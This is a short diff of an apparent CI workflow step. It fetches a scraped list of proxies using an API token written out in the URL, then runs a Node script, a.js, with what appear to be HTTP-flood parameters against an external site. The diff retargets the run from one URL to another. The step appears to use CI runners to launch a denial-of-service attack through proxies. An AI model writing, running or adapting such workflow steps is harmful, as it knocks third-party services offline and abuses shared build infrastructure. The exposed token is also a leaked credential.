@@ -39,7 +39,7 @@ jobs:
           
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=bo68Q074v9z71CF9M05c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
-          node a.js GET https://ipcount.dubidubidu.online/a20c3edd-d798-4c2f-9e18-ee79e1dbaf44 650 4 90 woo.txt --full --debug 
+          node a.js GET https://app.teamc2.xyz/ 250 4 1 woo.txt --full --debug 
           
 
           
